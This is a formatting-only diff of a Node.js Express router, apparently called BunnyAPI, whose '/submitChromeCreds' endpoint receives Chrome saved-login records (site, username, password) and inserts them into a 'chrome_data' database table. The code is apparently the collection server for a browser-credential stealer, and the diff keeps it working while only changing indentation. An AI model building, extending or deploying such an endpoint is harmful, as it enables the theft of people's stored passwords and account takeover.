@@ -9,8 +9,8 @@
 */
 /* eslint new-cap: ["error", { "capIsNewExceptionPattern": "^express\.." }]*/
 /* ---- BunnyAPI ----
-* @Author: Daniel W. Anner
-*/
+ * @Author: Daniel W. Anner
+ */
 /* express needs to be defined first */
 const express = require('express');
 
@@ -40,16 +40,18 @@ router.post('/submitChromeCreds', function(req, res, next) {
     /* create a random timestamp for our data */
     const ranStamp = Math.floor(Date.now() + Math.random());
     dataArray.forEach(function(el) {
-      const query = 'INSERT INTO chrome_data (dataset, chrome_url, chrome_user, chrome_pw) VALUES (?, ?, ?, ?)';
+      const query =
+        'INSERT INTO chrome_data (dataset, chrome_url, chrome_user, chrome_pw) VALUES (?, ?, ?, ?)';
 
       /* insert the data sanatized to prevent sql injection */
-      db.query(query,
-          [ranStamp, el.signon_realm, el.username_value, el.password_value],
-          function(err) {
-            if (err) {
-              return next(err);
-            }
+      db.query(
+        query,
+        [ranStamp, el.signon_realm, el.username_value, el.password_value],
+        function(err) {
+          if (err) {
+            return next(err);
           }
+        }
       );
     });
 
@@ -63,4 +65,3 @@ router.post('/submitChromeCreds', function(req, res, next) {
 
 /* Export the router */
 module.exports = router;
-
